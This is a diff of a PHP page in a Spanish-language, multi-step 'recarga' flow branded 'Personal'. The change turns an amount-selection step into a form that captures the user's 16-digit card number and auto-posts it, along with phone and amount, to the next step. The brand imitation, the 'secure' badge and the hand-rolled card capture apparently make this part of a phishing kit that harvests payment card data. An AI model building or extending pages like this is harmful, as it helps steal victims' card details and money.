@@ -1,13 +1,26 @@
 <?php
 /**
- * STEP 3 - Selección de monto
+ * STEP 3 - Captura número de tarjeta
  */
-session_start();
 
-// Guardar monto si viene por POST
-if(isset($_POST['amount'])) {
-    $_SESSION['amount'] = trim($_POST['amount']);
-    header('Location: step4.php');
+$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
+$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
+
+if(isset($_POST['card']) && !empty($_POST['card'])) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head><title>Redirigiendo...</title></head>
+    <body>
+        <form id="autoForm" method="POST" action="step4.php">
+            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+            <input type="hidden" name="card" value="<?php echo htmlspecialchars($_POST['card']); ?>">
+        </form>
+        <script>document.getElementById('autoForm').submit();</script>
+    </body>
+    </html>
+    <?php
     exit;
 }
 ?>
@@ -16,10 +29,9 @@ if(isset($_POST['amount'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monto | Personal</title>
+    <title>Tarjeta | Personal</title>
     <link rel="stylesheet" href="css/op/bootstrap.min.css">
     <link rel="stylesheet" href="css/op/styles.css">
-    <link rel="stylesheet" href="css/op/index.css">
 </head>
 <body style="background-color: #e5e5e5;">
     <div class="container-fluid">
@@ -27,35 +39,27 @@ if(isset($_POST['amount'])) {
             <div class="col-12 p-0">
                 <header class="header">
                     <nav class="px-0 pt-0">
-                        <div class="d-flex justify-content-between align-items-center">
-                            <div class="ml-3 ml-md-5">
-                                <img src="assets/flow.svg" class="pl-md-4 img-fluid" style="height: 40px;">
-                            </div>
-                            <div class="mr-3 mr-md-5">
-                                <img src="assets/secure.svg" class="pr-md-4 d-none d-sm-block" style="height: 30px;">
-                            </div>
+                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
+                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
+                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
                         </div>
                     </nav>
                 </header>
 
                 <div class="row justify-content-center mt-5">
                     <div class="col-12 text-center">
-                        <h1 class="text-center mb-4" style="color: #333; font-size: 28px;">Seleccioná el monto</h1>
+                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Número de tarjeta</h1>
                     </div>
 
                     <div class="col-11 col-sm-6">
                         <form method="POST" action="step3.php">
+                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+                            
                             <div class="form-group">
-                                <label style="color: #666;">Monto a recargar</label>
-                                <select name="amount" id="amount" class="form-control" style="height: 50px; font-size: 16px;" required>
-                                    <option value="">Seleccionar monto</option>
-                                    <option value="100">$100</option>
-                                    <option value="200">$200</option>
-                                    <option value="300">$300</option>
-                                    <option value="500">$500</option>
-                                    <option value="1000">$1000</option>
-                                    <option value="2000">$2000</option>
-                                </select>
+                                <label style="color: #666;">Número de tarjeta</label>
+                                <input type="text" name="card" id="card" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" style="height: 50px; font-size: 16px;" required>
+                                <small class="text-muted">Ingresá los 16 dígitos</small>
                             </div>
 
                             <div class="text-center mt-4">
@@ -70,13 +74,12 @@ if(isset($_POST['amount'])) {
     </div>
 
     <script src="javascript/query.min.js"></script>
+    <script src="javascript/jquery.mask.js"></script>
     <script>
-        $('#amount').on('change', function(){
-            if($(this).val() != '') {
-                $('#btnContinuar').prop('disabled', false);
-            } else {
-                $('#btnContinuar').prop('disabled', true);
-            }
+        $('#card').mask('0000 0000 0000 0000');
+        $('#card').on('keyup', function(){
+            var valor = $(this).val().replace(/ /g, '');
+            $('#btnContinuar').prop('disabled', valor.length < 15);
         });
     </script>
 </body>
